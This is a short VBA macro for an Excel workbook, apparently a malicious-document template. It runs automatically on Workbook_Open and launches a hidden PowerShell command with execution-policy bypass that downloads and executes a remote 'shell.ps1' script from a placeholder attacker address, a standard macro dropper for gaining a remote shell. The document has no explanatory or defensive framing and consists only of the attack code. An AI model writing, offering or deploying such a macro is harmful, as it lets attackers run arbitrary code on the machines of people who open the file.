Private Sub Workbook_Open()
    ExecPayload
End Sub

Sub ExecPayload()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    Dim command As String
    command = "powershell.exe -nop -w hidden -ep bypass iex (new-object net.webclient).downloadstring('<ATTACKER IP>/shell.ps1')"

    shell.Run command, 0
End Sub